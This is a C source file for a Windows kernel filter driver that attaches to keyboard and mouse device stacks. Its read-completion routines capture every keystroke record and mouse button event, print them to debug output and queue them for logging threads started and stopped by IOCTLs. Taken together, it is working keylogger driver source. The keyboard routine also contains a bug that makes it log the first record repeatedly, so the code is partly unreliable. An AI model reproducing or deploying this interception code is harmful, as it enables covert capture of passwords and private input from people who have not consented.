#include "dispatch.h"
#include "debug.h"
#include "ioctl.h"

NTSTATUS LmbPassThrough(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	const PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);

	switch (pStackLocation->MajorFunction) {
	case IRP_MJ_CREATE:
		DBG_PRINT("LmbPassThrough: Case IRP_MJ_CREATE\n");
		break;
	case IRP_MJ_CLOSE:
		DBG_PRINT("LmbPassThrough: Case IRP_MJ_CLOSE\n");
		break;
	case IRP_MJ_CLEANUP:
		DBG_PRINT("LmbPassThrough: Case IRP_MJ_CLEANUP\n");
		break;
	default:
		DBG_PRINTF("LmbPassThrough: Unknown case 0x%lx\n", pStackLocation->MajorFunction);
		break;
	}

	if (pDeviceObject->DeviceExtension) {
		const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;

		// if current device is attached to a lower level device, its driver needs to be called
		if (pTargetDevice) {
			IoSkipCurrentIrpStackLocation(pIrp);

			DBG_PRINT("LmbPassThrough: Calling IoCallDriver\n");

			return IoCallDriver(pTargetDevice, pIrp);
		}
		else {
			DBG_PRINT("LmbPassThrough: No target device in device extension\n");
		}

	}

	const NTSTATUS ntStatus = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = ntStatus;
	IofCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}


BOOLEAN isLogging;

static NTSTATUS dispatchDevCtlLogStart(PDEVICE_OBJECT pDeviceObject);
static NTSTATUS dispatchDevCtlLogStop();

NTSTATUS LmbDispatchDeviceControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	const PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	
	if (pStackLocation->MajorFunction != IRP_MJ_DEVICE_CONTROL) {
		DBG_PRINT("LmbDispatchDeviceControl: Invalid major function\n");

		return STATUS_INVALID_PARAMETER;
	}

	#ifdef DBG
	const ULONG ioControlCode = pStackLocation->Parameters.DeviceIoControl.IoControlCode;
	#endif // DBG

	DBG_PRINTF("LmbDispatchDeviceControl: Received IO control code: 0x%lx\n", ioControlCode);

	NTSTATUS ntStatus = STATUS_SUCCESS;

	switch (pStackLocation->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_SEND_LOG_STATE:
		*(BOOLEAN*)pIrp->AssociatedIrp.SystemBuffer = isLogging;
		pIrp->IoStatus.Information = sizeof(BOOLEAN);
		DBG_PRINTF("LmbDispatchDeviceControl: Sent log state: %hhu\n", isLogging);
		break;
	case IOCTL_LOG_START:
		ntStatus = dispatchDevCtlLogStart(pDeviceObject);

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("LmbDispatchDeviceControl: dispatchDevCtlLogStart failed: 0x%lx\n", ntStatus);
		}
		
		pIrp->IoStatus.Information = 0;
		break;
	case IOCTL_LOG_STOP:
		ntStatus = dispatchDevCtlLogStop();

		if (!NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("LmbDispatchDeviceControl: dispatchDevCtlLogStop failed: 0x%lx\n", ntStatus);
		}

		pIrp->IoStatus.Information = 0;
		break;
	default:
		ntStatus = STATUS_INVALID_PARAMETER;
	}

	pIrp->IoStatus.Status = ntStatus;
	IofCompleteRequest(pIrp, IO_NO_INCREMENT);

	return ntStatus;
}


KSEMAPHORE readSemaphores[LOG_MAX];

static NTSTATUS completeKbdRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
static NTSTATUS completeMouRead(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);

NTSTATUS LmbDispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	
	if (!pDeviceObject->DeviceExtension) {
		DBG_PRINT("LmbDispatchRead: No device extension\n");

		return STATUS_INVALID_PARAMETER;
	}

	const PDEVICE_OBJECT pTargetDevice = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->DeviceObject;

	if (!pTargetDevice) {
		DBG_PRINT("LmbDispatchRead: No target device\n");

		return STATUS_INVALID_PARAMETER;
	}

	CSHORT devType = ((PDEVOBJ_EXTENSION)pDeviceObject->DeviceExtension)->Type;
	PIO_COMPLETION_ROUTINE pIoCompletionRoutine = NULL;
	LogType logType = LOG_KBD;

	switch (devType) {
	case FILE_DEVICE_KEYBOARD:
		pIoCompletionRoutine = completeKbdRead;
		logType = LOG_KBD;
		break;
	case FILE_DEVICE_MOUSE:
		pIoCompletionRoutine = completeMouRead;
		logType = LOG_MOU;
		break;
	default:
		DBG_PRINT("LmbDispatchRead: Unknown device type\n");
		return STATUS_DEVICE_DATA_ERROR;
	}

	// timeout needs to be zero at IRQL >= DISPATCH_LEVEL
	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
	const NTSTATUS ntStatus = KeWaitForSingleObject(&readSemaphores[logType], Executive, KernelMode, FALSE, &zeroTimeout);

	if (!NT_SUCCESS(ntStatus)) {
		DBG_PRINTF("dispatchKbdRead: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);

		return ntStatus;
	}
	else if (ntStatus == STATUS_TIMEOUT) {
		DBG_PRINT("dispatchKbdRead: KeWaitForSingleObject timeout\n");
		IoSkipCurrentIrpStackLocation(pIrp);

		return IoCallDriver(pTargetDevice, pIrp);
	}

	IoCopyCurrentIrpStackLocationToNext(pIrp);
	IoSetCompletionRoutine(pIrp, pIoCompletionRoutine, NULL, TRUE, TRUE, TRUE);

	return IoCallDriver(pTargetDevice, pIrp);
}


static NTSTATUS dispatchDevCtlLogStart(PDEVICE_OBJECT pDeviceObject) {
	LARGE_INTEGER zeroTimeout = { .QuadPart = 0 };
	NTSTATUS ntStatus = STATUS_SUCCESS;
	
	// check if all threads (if any) have finished yet
	for (int i = 0; i < LOG_MAX; i++) {

		if (pLogThreads[i]) {
			ntStatus = KeWaitForSingleObject(pLogThreads[i], Executive, KernelMode, FALSE, &zeroTimeout);

			if (!NT_SUCCESS(ntStatus)) {
				DBG_PRINTF("dispatchDevCtlLogStart: KeWaitForSingleObject failed: 0x%lx\n", ntStatus);

				return ntStatus;
			}
			else if (ntStatus == STATUS_TIMEOUT) {
				DBG_PRINT("dispatchDevCtlLogStart: KeWaitForSingleObject timeout\n");

				return ntStatus;
			}

		}

	}

	isLogging = TRUE;

	for (int i = 0; i < LOG_MAX; i++) {
		ntStatus = startLogThread(pDeviceObject->DriverObject, i);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("dispatchDevCtlLogStart: Started log thread %d\n", i);
		}
		else {
			DBG_PRINTF2("dispatchDevCtlLogStart: startLogThread failed for log thread %d: 0x%lx\n", i, ntStatus);

			return ntStatus;
		}

	}

	return ntStatus;
}


static NTSTATUS dispatchDevCtlLogStop() {
	isLogging = FALSE;
	NTSTATUS ntStatus = STATUS_SUCCESS;

	for (int i = 0; i < LOG_MAX; i++) {
		ntStatus = stopLogThread(i);

		if (NT_SUCCESS(ntStatus)) {
			DBG_PRINTF("dispatchDevCtlLogStop: Stopped log thread %d\n", i);
		}
		else {
			DBG_PRINTF2("dispatchDevCtlLogStop: stopLogThread failed for type %d: 0x%lx\n", i, ntStatus);
		}

	}

	return ntStatus;
}


static NTSTATUS completeKbdRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pContext);

	const size_t countData = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

	for (size_t i = 0; i < countData; i++) {

		if (!isLogging) break;

		const PKEYBOARD_INPUT_DATA pKbdInputData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;

		if (!pKbdInputData) {
			DBG_PRINT("completeKbdRead: No data\n");

			continue;
		}

		logKbdToDbg(pKbdInputData);

		KbdDataEntry* const pKbdDataEntry = (KbdDataEntry*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KbdDataEntry), KBD_LIST_DATA_TAG);

		if (!pKbdDataEntry) {
			DBG_PRINT("completeKbdRead: ExAllocatePool2 failed\n");

			continue;
		}

		pKbdDataEntry->data = *pKbdInputData;
		const NTSTATUS ntStatus = addToBlockigQueue(&inputQueues[LOG_KBD], &pKbdDataEntry->list);

		if (ntStatus != STATUS_SUCCESS) {
			DBG_PRINTF("completeKbdRead: addBlockigQueue failed: 0x%lx\n", ntStatus);

			ExFreePoolWithTag(pKbdDataEntry, KBD_LIST_DATA_TAG);
		}

	}

	NTSTATUS ntStatus = pIrp->IoStatus.Status;

	if (pIrp->PendingReturned) {
		IoMarkIrpPending(pIrp);
		ntStatus = STATUS_PENDING;
	}

	// finish read operation
	KeReleaseSemaphore(&readSemaphores[LOG_KBD], 0, 1, FALSE);

	return ntStatus;
}


static NTSTATUS completeMouRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID pContext) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	UNREFERENCED_PARAMETER(pContext);

	const size_t countData = pIrp->IoStatus.Information / sizeof(MOUSE_INPUT_DATA);

	for (size_t i = 0; i < countData; i++) {

		if (!isLogging) break;

		const PMOUSE_INPUT_DATA pMouInputData = (PMOUSE_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer + i;

		if (!pMouInputData) {
			DBG_PRINT("completeMouRead: No data\n");

			continue;
		}

		// just log button clicks, no cursor movements
		if (pMouInputData->ButtonFlags) {
			logMouToDbg(pMouInputData);

			MouDataEntry* const pMouDataEntry = (MouDataEntry*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(MouDataEntry), MOU_LIST_DATA_TAG);

			if (!pMouDataEntry) {
				DBG_PRINT("completeMouRead: ExAllocatePool2 failed\n");

				continue;
			}

			pMouDataEntry->data = *pMouInputData;
			const NTSTATUS ntStatus = addToBlockigQueue(&inputQueues[LOG_MOU], &pMouDataEntry->list);

			if (ntStatus != STATUS_SUCCESS) {
				DBG_PRINTF("completeMouRead: addBlockigQueue failed: 0x%lx\n", ntStatus);

				ExFreePoolWithTag(pMouDataEntry, MOU_LIST_DATA_TAG);
			}

		}

	}	

	NTSTATUS ntStatus = pIrp->IoStatus.Status;

	if (pIrp->PendingReturned) {
		IoMarkIrpPending(pIrp);
		ntStatus = STATUS_PENDING;
	}

	// finish read operation
	KeReleaseSemaphore(&readSemaphores[LOG_MOU], 0, 1, FALSE);

	return ntStatus;
}